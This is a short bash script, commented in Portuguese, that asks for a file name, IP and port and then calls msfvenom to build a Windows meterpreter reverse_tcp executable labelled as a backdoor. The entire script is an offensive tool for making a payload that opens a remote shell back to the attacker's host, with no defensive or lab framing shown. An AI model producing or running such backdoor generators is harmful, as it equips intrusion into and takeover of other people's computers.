#!/bin/bash

#Extraindo o nome do backdoor
read -p "Informe o nome do seu backdoor: ex: backdoor.exe " nome

#Extraindo o ip
read -p "Informe seu ip interno ou externo: " ip
 
#Extraindo a porta
read -p "Informe uma porta: " porta

echo "Criando backdoor...."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > /home/andrey/$nome


